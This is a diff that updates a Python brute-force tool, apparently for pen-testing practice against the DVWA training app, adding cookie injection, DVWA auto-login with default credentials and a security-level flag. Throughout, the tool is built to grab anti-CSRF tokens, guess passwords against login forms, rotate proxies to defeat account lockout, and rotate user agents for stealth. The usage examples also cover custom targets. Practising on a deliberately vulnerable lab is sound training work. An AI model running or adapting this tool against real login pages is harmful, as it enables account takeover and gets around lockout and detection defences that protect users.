@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-CSRF-Aware Brute Force Engine v2.1
+CSRF-Aware Brute Force Engine v2.2
 ====================================
 A penetration testing tool that bypasses Anti-CSRF token mechanisms
 to perform authenticated brute-force attacks against login forms.
@@ -10,12 +10,10 @@ Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)
 
 AUTHORIZED USE ONLY - Ensure written permission before testing.
 
-v2.1 Changes:
-  - GET/POST method support (DVWA brute uses GET, login.php uses POST)
-  - Fixed default failure string for DVWA
-  - Proxy rotation from proxy list file (lockout bypass)
-  - Lockout threshold control per proxy
-  - Improved response analysis
+v2.2 Changes:
+  - Cookie injection (--cookie) for authenticated DVWA sessions
+  - DVWA security level shortcut (--security low|medium|high|impossible)
+  - Auto-login to DVWA when no cookies provided
 
 Algorithm Steps Implemented:
   1. Session Initialization & State Management
@@ -337,13 +335,14 @@ def print_banner(
     target_url: str, username: str, wordlist_path: str,
     total_passwords: int, token_name: str, method: str,
     jitter_range: Tuple[float, float], rotate_ua: bool,
-    proxy: Optional[str], proxy_pool: Optional[ProxyPool] = None
+    proxy: Optional[str], proxy_pool: Optional[ProxyPool] = None,
+    security_level: Optional[str] = None, has_cookies: bool = False
 ):
     w = 65
     
     print()
     print(f"{C.MAGENTA}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
-    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.1{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
+    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.2{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
     print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.DIM}MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation{' ' * (w - 62)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
     print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
     
@@ -356,6 +355,12 @@ def print_banner(
         ("Jitter",     f"{jitter_range[0]:.1f}s — {jitter_range[1]:.1f}s"),
         ("UA Rotate",  "Enabled ✓" if rotate_ua else "Disabled ✗"),
     ]
+    
+    if security_level:
+        configs.append(("DVWA Level", security_level))
+    
+    auth_mode = "Cookie injection" if has_cookies else "Auto-login"
+    configs.append(("Auth", auth_mode))
     
     if proxy_pool and proxy_pool.is_active:
         configs.append(("Proxy Pool", f"{proxy_pool.alive_count} proxies (rotate every {proxy_pool.threshold} attempts)"))
@@ -379,17 +384,119 @@ def print_banner(
 # STEP 1: Session Initialization & State Management
 # ============================================================================
 
+def parse_cookie_string(cookie_str: str) -> dict:
+    """
+    Parse a cookie string like 'PHPSESSID=abc123; security=low' into a dict.
+    Accepts browser-copy format or semicolon-separated key=value pairs.
+    """
+    cookies = {}
+    if not cookie_str:
+        return cookies
+    for part in cookie_str.split(";"):
+        part = part.strip()
+        if "=" in part:
+            key, value = part.split("=", 1)
+            cookies[key.strip()] = value.strip()
+    return cookies
+
+
+def dvwa_auto_login(
+    session: requests.Session,
+    target_url: str,
+    dvwa_user: str = "admin",
+    dvwa_pass: str = "password",
+    verbose: bool = False
+) -> bool:
+    """
+    Automatically log into DVWA to establish an authenticated session.
+    
+    DVWA default credentials: admin / password
+    This authenticates the session so we can access /vulnerabilities/* pages.
+    
+    The DVWA login form at /login.php uses POST with:
+      username, password, Login, user_token (CSRF)
+    """
+    parsed = urlparse(target_url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    # Detect if DVWA is in a subdirectory (e.g., /DVWA/)
+    path_parts = parsed.path.strip("/").split("/")
+    dvwa_base = base
+    if path_parts and path_parts[0].upper() == "DVWA":
+        dvwa_base = f"{base}/{path_parts[0]}"
+    
+    login_page_url = f"{dvwa_base}/login.php"
+    
+    print(f"  {C.CYAN}[AUTH]{C.RST} Auto-login to DVWA at {C.DIM}{login_page_url}{C.RST}")
+    
+    try:
+        # GET the login page to grab the CSRF token
+        resp = session.get(login_page_url, timeout=15)
+        resp.raise_for_status()
+        
+        # Extract user_token from login page
+        token_match = re.search(
+            r"name=['\"]?user_token['\"]?\s+value=['\"]?([a-fA-F0-9]+)",
+            resp.text, re.IGNORECASE
+        )
+        if not token_match:
+            token_match = re.search(
+                r"value=['\"]?([a-fA-F0-9]+)['\"]?\s+name=['\"]?user_token",
+                resp.text, re.IGNORECASE
+            )
+        
+        if not token_match:
+            print(f"  {C.BYELLOW}[AUTH]{C.RST} Could not find CSRF token on DVWA login page")
+            print(f"         {C.DIM}Use --cookie to inject your own session cookies{C.RST}")
+            return False
+        
+        login_token = token_match.group(1)
+        
+        # POST login credentials
+        login_data = {
+            "username": dvwa_user,
+            "password": dvwa_pass,
+            "Login": "Login",
+            "user_token": login_token,
+        }
+        
+        login_resp = session.post(
+            login_page_url, data=login_data,
+            allow_redirects=True, timeout=15
+        )
+        
+        # Check if login succeeded (redirected to index.php or no "Login failed")
+        if "login.php" in login_resp.url and "login failed" in login_resp.text.lower():
+            print(f"  {C.BRED}[AUTH FAIL]{C.RST} DVWA login failed with {dvwa_user}:{dvwa_pass}")
+            print(f"             {C.DIM}Use --cookie to inject valid session cookies{C.RST}")
+            return False
+        
+        print(
+            f"  {C.BGREEN}[AUTH]{C.RST} Logged into DVWA as {C.BOLD}{dvwa_user}{C.RST} "
+            f"{C.DIM}| PHPSESSID={dict(session.cookies).get('PHPSESSID', '?')}{C.RST}"
+        )
+        return True
+        
+    except requests.RequestException as e:
+        print(f"  {C.BRED}[AUTH FAIL]{C.RST} Could not reach DVWA login: {e}")
+        return False
+
+
 def init_session(
     target_url: str,
     proxy: Optional[str] = None,
     proxy_dict: Optional[dict] = None,
+    cookies: Optional[str] = None,
+    security_level: Optional[str] = None,
+    dvwa_auto: bool = True,
     verbose: bool = False
 ) -> requests.Session:
     """
     STEP 1: Initialize a persistent HTTP session.
     
-    Establishes PHPSESSID binding with the target server.
-    Supports both single proxy and proxy-pool rotation.
+    Three authentication modes:
+    1. Cookie injection (--cookie): Uses your browser's PHPSESSID directly
+    2. Auto-login (default): Logs into DVWA with admin/password automatically
+    3. Security level (--security): Sets DVWA's 'security' cookie
     """
     session = requests.Session()
 
@@ -414,14 +521,40 @@ def init_session(
     try:
         init_response = session.get(base_url, timeout=15)
         init_response.raise_for_status()
-        cookies = dict(session.cookies)
-        print(
-            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized {C.DIM}|{C.RST} "
-            f"Cookies: {C.CYAN}{cookies}{C.RST}"
-        )
     except requests.RequestException as e:
         print(f"  {C.BRED}[STEP 1 FAIL]{C.RST} Connection failed: {e}")
         raise SystemExit(f"[!] Cannot reach target: {e}")
+
+    # --- Authentication ---
+    if cookies:
+        # Mode 1: Manual cookie injection from browser
+        parsed_cookies = parse_cookie_string(cookies)
+        for name, value in parsed_cookies.items():
+            session.cookies.set(name, value)
+        print(
+            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized with injected cookies "
+            f"{C.DIM}|{C.RST} {C.CYAN}{parsed_cookies}{C.RST}"
+        )
+    elif dvwa_auto:
+        # Mode 2: Auto-login to DVWA
+        print(
+            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized "
+            f"{C.DIM}|{C.RST} Cookies: {C.CYAN}{dict(session.cookies)}{C.RST}"
+        )
+        dvwa_auto_login(session, target_url, verbose=verbose)
+    else:
+        print(
+            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized "
+            f"{C.DIM}|{C.RST} Cookies: {C.CYAN}{dict(session.cookies)}{C.RST}"
+        )
+    
+    # Set DVWA security level cookie
+    if security_level:
+        session.cookies.set("security", security_level)
+        print(
+            f"  {C.CYAN}[STEP 1]{C.RST} DVWA security level → "
+            f"{C.BOLD}{security_level}{C.RST}"
+        )
 
     return session
 
@@ -684,6 +817,8 @@ def run_attack(
     proxy: Optional[str] = None,
     proxy_file: Optional[str] = None,
     lockout_threshold: int = 2,
+    cookies: Optional[str] = None,
+    security_level: Optional[str] = None,
     verbose: bool = False,
     output_file: Optional[str] = None,
 ) -> Optional[str]:
@@ -727,7 +862,9 @@ def run_attack(
         wordlist_path=wordlist_path, total_passwords=total,
         token_name=token_name, method=method.upper(),
         jitter_range=jitter_range, rotate_ua=rotate_ua,
-        proxy=proxy, proxy_pool=proxy_pool
+        proxy=proxy, proxy_pool=proxy_pool,
+        security_level=security_level,
+        has_cookies=bool(cookies)
     )
     
     if total == 0:
@@ -742,10 +879,14 @@ def run_attack(
     # Determine initial proxy
     if proxy_pool and proxy_pool.is_active:
         session = init_session(
-            login_url, proxy_dict=proxy_pool.get_proxy_dict(), verbose=verbose
+            login_url, proxy_dict=proxy_pool.get_proxy_dict(),
+            cookies=cookies, security_level=security_level, verbose=verbose
         )
     else:
-        session = init_session(login_url, proxy=proxy, verbose=verbose)
+        session = init_session(
+            login_url, proxy=proxy,
+            cookies=cookies, security_level=security_level, verbose=verbose
+        )
     
     print()
     cracked_password = None
@@ -918,27 +1059,26 @@ def run_attack(
 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
-        description="CSRF-Aware Brute Force Engine v2.1",
+        description="CSRF-Aware Brute Force Engine v2.2",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # DVWA brute force page (uses GET method)
-  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt
+  # DVWA brute force (auto-login with default creds admin/password)
+  python3 csrf_brute.py -t http://localhost/DVWA/vulnerabilities/brute/ -u admin -w wordlists/sample.txt
 
-  # DVWA main login page (uses POST method)
-  python3 csrf_brute.py -t http://192.168.1.100/login.php -u admin -w wordlists/sample.txt -m POST
+  # DVWA with explicit security level
+  python3 csrf_brute.py -t http://localhost/DVWA/vulnerabilities/brute/ -u admin -w wordlists/sample.txt --security high
+
+  # With browser cookies (copy from DevTools → Application → Cookies)
+  python3 csrf_brute.py -t http://localhost/DVWA/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
+      --cookie "PHPSESSID=abc123def456; security=low"
+
+  # DVWA main login page (POST method)
+  python3 csrf_brute.py -t http://localhost/DVWA/login.php -u admin -w wordlists/sample.txt -m POST
 
   # Impossible mode — proxy rotation to bypass lockout
-  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
-      --proxy-list proxies.txt --lockout-after 2
-
-  # Custom app
-  python3 csrf_brute.py -t http://target.local/auth/login -u admin -w rockyou.txt -m POST \\
-      --token-name csrf_token --failure "Invalid credentials"
-
-  # With Burp Suite proxy
-  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
-      --proxy http://127.0.0.1:8080 -v
+  python3 csrf_brute.py -t http://localhost/DVWA/vulnerabilities/brute/ -u admin -w wordlists/sample.txt \\
+      --security impossible --proxy-list proxies.txt --lockout-after 2
 
   # Maximum stealth
   python3 csrf_brute.py -t http://target/login -u admin -w wordlists/sample.txt \\
@@ -966,6 +1106,11 @@ Examples:
         help="Max jitter delay seconds (default: 2.0)")
     parser.add_argument("--no-ua-rotate", action="store_true",
         help="Disable User-Agent rotation")
+    parser.add_argument("-c", "--cookie",
+        help='Inject browser cookies (e.g., "PHPSESSID=abc123; security=low")')
+    parser.add_argument("-s", "--security",
+        choices=["low", "medium", "high", "impossible"],
+        help="DVWA security level (sets the 'security' cookie)")
     parser.add_argument("--proxy",
         help="Single HTTP proxy (e.g., http://127.0.0.1:8080)")
     parser.add_argument("--proxy-list",
@@ -996,6 +1141,8 @@ def main():
         proxy=args.proxy,
         proxy_file=args.proxy_list,
         lockout_threshold=args.lockout_after,
+        cookies=args.cookie,
+        security_level=args.security,
         verbose=args.verbose,
         output_file=args.output,
     )
